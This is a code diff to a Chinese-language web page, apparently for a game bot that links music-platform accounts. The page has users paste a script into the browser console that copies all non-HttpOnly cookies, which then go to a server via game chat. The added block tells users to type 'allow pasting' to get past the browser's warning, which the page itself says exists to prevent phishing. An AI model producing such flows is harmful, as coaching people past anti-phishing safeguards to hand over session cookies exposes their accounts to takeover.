@@ -76,6 +76,13 @@ document.getElementById('content').innerHTML = `
   <div class="code-box" id="code">${escapeHtml(meta.js)}</div>
   <button class="btn" id="copyBtn" onclick="copyCode()">📋 一键复制代码</button>
   <div id="result" style="margin-top:12px"></div>
+  <div class="card" style="background:#fff7ed;border-color:#fed7aa;margin-top:16px">
+    <p style="margin:0;font-size:14px;color:#9a3412"><b>⚠️ 遇到 "禁止粘贴" / "Allow pasting" 提醒？</b></p>
+    <p style="margin:8px 0 0;font-size:13px;color:#9a3412">浏览器会阻止在控制台粘贴代码 (防止钓鱼)。如果粘贴时弹出警告：</p>
+    <p style="margin:8px 0 0;font-size:13px;color:#9a3412">① 不要关闭警告，直接在控制台输入 <code style="background:#fee2e2;padding:2px 6px;border-radius:4px;font-weight:bold">允许粘贴</code> 后回车</p>
+    <p style="margin:6px 0 0;font-size:13px;color:#9a3412">② Chrome 用户输入 <code style="background:#fee2e2;padding:2px 6px;border-radius:4px;font-weight:bold">allow pasting</code> 后回车</p>
+    <p style="margin:6px 0 0;font-size:13px;color:#9a3412">③ 然后再次粘贴我们的代码，按回车即可</p>
+  </div>
   <hr style="margin:20px 0;border:none;border-top:1px solid #e4e4e7">
   <p style="font-size:14px;color:#71717a">控制台显示 <b style="color:#15803d">已复制到剪贴板</b> 后，回到游戏按 <b>Ctrl+V</b> 粘贴到聊天栏，回车即可完成绑定。</p>
   <p style="font-size:13px;color:#71717a">说明: 此脚本会复制浏览器中所有可见的 cookie (非 HttpOnly), 服务端会原样透传给对应音乐平台 API, 不需要您手动找字段名。</p>
